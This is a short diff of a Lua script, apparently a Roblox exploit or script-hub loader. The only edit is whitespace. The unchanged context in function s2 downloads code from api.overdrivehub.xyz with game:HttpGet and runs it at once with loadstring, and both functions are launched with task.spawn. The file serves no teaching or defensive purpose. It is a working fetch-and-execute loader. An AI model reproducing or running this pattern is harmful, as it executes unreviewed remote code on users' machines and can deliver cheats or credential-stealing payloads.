@@ -3,6 +3,6 @@ local function s1()
 end 
 local function s2() 
     loadstring(game:HttpGet("https://api.overdrivehub.xyz/v1/auth"))()
-end
+end 
 task.spawn(s1)
 task.spawn(s2)
